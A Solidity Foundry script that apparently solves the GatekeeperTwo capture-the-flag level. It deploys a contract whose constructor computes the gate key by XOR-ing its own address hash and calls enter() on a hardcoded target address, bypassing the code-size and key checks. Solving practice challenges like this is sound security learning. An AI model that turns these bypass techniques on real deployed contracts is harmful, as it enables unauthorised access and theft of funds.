/// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Script.sol";

interface IGatekeeperTwo {
    function enter(bytes8 _gateKey) external returns (bool);
}

contract EntrantTwo {
    constructor(address _gatekeeperTwo) {
        uint64 x = uint64(bytes8(keccak256(abi.encodePacked(address(this))))) ^
            type(uint64).max;
        bytes8 _gateKey = bytes8(uint64(x));
        IGatekeeperTwo(_gatekeeperTwo).enter(_gateKey);
    }
}

contract GatekeeperTwo is Script {
    function run() public {
        vm.startBroadcast();

        new EntrantTwo(0xab7DbA209b4EA30B63a0dfe28049040243eF769F);

        vm.stopBroadcast();
    }
}
